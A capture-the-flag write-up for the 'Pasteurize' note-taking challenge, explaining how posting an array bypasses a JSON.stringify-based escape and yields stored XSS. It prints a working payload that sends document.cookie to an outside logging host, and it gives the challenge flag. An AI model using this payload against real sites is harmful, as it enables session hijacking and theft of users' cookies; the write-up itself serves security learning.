# Pasteurize
*Solution and write-up by team [Kalmarunionen](https://capturetheflag.withgoogle.com/scoreboard/kalmarunionen).*

This is a simple website which allows the user to create notes. Unintendedly, we can get full stored XSS on the website.

## Details

Post an array instead of a single value, then we can just inject JS directly. Vulnerable code:
```
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```

POST with `content=alert()` yields the expected:

```
<script>
        const note = "alert()";
        const note_id = "8028b109-cac1-4351-ad42-16c61cded87d";
...
```

POST with `content[]=; alert(); //` yields XSS:
```
<script>
        const note = ""; alert(); //"";
        const note_id = "8028b109-cac1-4351-ad42-16c61cded87d";
```

Thus, from here it is a simply matter of e.g. redirecting to steal the cookie. Payload is `; window.location = 'http://xss.wep.dk/log/5f40ca5c92911/writeup/?' + document.cookie; //`, yielding the result:
```
<script>
        const note = ""; window.location = 'http://xss.wep.dk/log/5f40ca5c92911/writeup/?' + document.cookie; //"";
        const note_id = "8028b109-cac1-4351-ad42-16c61cded87d";        
```

And thereby leaking the flag. The result can be observed on our website: http://xss.wep.dk/?id=5f40ca5c92911

## FLAG
Flag: `CTF{Express_t0_Tr0ubl3s}`
